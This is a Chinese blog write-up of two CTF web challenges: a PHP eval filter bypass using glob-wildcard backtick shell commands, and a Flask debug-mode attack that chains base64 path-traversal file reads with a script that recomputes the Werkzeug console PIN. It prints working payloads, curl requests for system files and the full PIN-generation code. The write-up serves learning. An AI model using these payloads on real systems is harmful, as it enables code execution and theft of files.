---
title: 学习CTF之安恒题记
date: 2018-11-12 00:07:58
tags:
  - CTF
  - 信息安全
  - web安全
  - write-up
categories: 信息安全
---

# 前言



一边无奈学习开发，一边不想放下自己的喜爱的信息安全方向。但我也怕顾此失彼啊，无奈。这里顺手记录下题解吧，不定时append

<!-- more -->


# babybypass

> 出自：[linkedbyX-11.11特别赛①](https://xpro-adl.91ctf.com/match/CTF125/) PS：这个题目其实就是安恒9月web题原题。

```php
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>35){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?>
```

从GET中取code键值两个要求

- 长度不能超过35
- 符合`[A-Za-z0-9_$]+`正则表达式，不能出现字母数字和`_$`

Orz，感觉思考不出来，只记得ph牛博客中好像有一遍可以不用字母就能构造shell的。于是找了一波资料原来是这种操作。

因为正则把$给限制了加之长度限制，所以这里不能用构造变量的方法，于是采用Linux下的glob通配符

- `*`可以代替0个及以上任意字符
- `?`可以代表1个任意字符

```http
GET /?code=?><?=`/???/???%20/???/???/????/*`?> HTTP/1.1
Host: 101.71.29.5:10049
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

用`?>`先闭合前面，再`<??>`使用反引号来执行shell命令

![index.php源码](https://upload-images.jianshu.io/upload_images/14657587-7a8643e864544eda.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


读到了index.php源码，flag文件就在/flag下面，那就直接读它

```http
GET /?code=?><?=`/???/???%20/????`;?> HTTP/1.1
Host: 101.71.29.5:10049
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

flag{aa5237a5fc25af3fa07f1d724f7548d7}
```



这道题涉及到的知识点太多了，各位大佬的博客也是脑洞打开，各种奇淫巧技都有。后面再专做文章研究吧，在此不展开

## reference

- ph牛
  - [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
  - [无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

- 安全客：[CTF题目思考--极限利用](https://www.anquanke.com/post/id/154284)

- 一叶飘零师傅：[2018安恒杯-9月月赛Writeup](http://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/)
- Angel_Kitty：[记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门](http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html)





# 粗心的程序员呀

> 出自：[LinkedbyX-11.11特别赛③](https://xpro-adl.91ctf.com/match/CTF123/) PS：这个好像是8月月赛原题

打开地址，发现注册会报错，从错误信息中发现是Flask且开了debug，在页面中需要pin码就能打开console。还发现了页面image的src路径有蹊跷。测试是base64编码。于是存在任意文件读取漏洞。

![报错](https://upload-images.jianshu.io/upload_images/14657587-58bd1b6e5d9ac6f3.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


flask并不太熟悉，Python web我还没好好学flask，于是看了一波资料。又是大佬们的长篇精彩分析，这题的题解如下

根据文章对pin码的生成分析，要获取6个变量值

```python
username # 用户名

modname # flask.app

getattr(app, '__name__', getattr(app.__class__, '__name__')) # Flask

getattr(mod, '__file__', None) # flask目录下的一个app.py的绝对路径

uuid.getnode() # mac地址十进制

get_machine_id() # /etc/machine-id
```

放到这题中来分别读取的payload为

1. username为ctf，读取`../../..//etc/passwd` 这里从页面中知道了脚本路径，这里引用相对路径。还有即使不知道，无线向上..也是可以的，payload url为
   `curl http://101.71.29.5:10057/image/Ly4uLy4uLy4uL2V0Yy9wYXNzd2Q=`

2. modename模块名为flask.app

3. uuid.getnode这个是mac地址十进制，为2485377892354。我们先用读/sys/class/net/eth0/address，在转下十进制就好了，payload url为
   `curl http://101.71.29.5:10057/image/Ly4uLy4uLy4uL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNz`

4. get_machine_id这个这里是空，`/etc/machine-id`和`/proc/sys/kernel/random/boot_id`都空白内容。不知额

5. app的`__name__`为Flask

6. mod的`__file__`这里试了网页上爆出的路径为`/usr/local/lib/python2.7/dist-packages/flask/app.py`但是这样生成的pin就是不对额，后来看表哥们的wp，这里要用pyc。

   > PS：pyc是Python的编译后的字节码文件，如果py文件没有修改的话，都是执行pyc文件的，如果py源文件修改了pyc文件会重新编译。而且还有一个很重要的点，如果py源文件不存在，会执行pyc文件的！！原pyc文件。

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892354'# str(uuid.getnode()),  /sys/class/net/eth0/address # 网卡十进制，读完转一下
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

最终的pin为131-442-946

然后在网页中读取下文件flag内容

![读取flag](https://upload-images.jianshu.io/upload_images/14657587-9bce46950d64ca06.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



## reference

- 先知：https://xz.aliyun.com/t/2553
- [Flask debug 模式 PIN 码生成机制安全性研究笔记](http://www.91ri.org/17362.html)



## Mark

- Flask安全周边学习
- Flask开发学习





后续更新~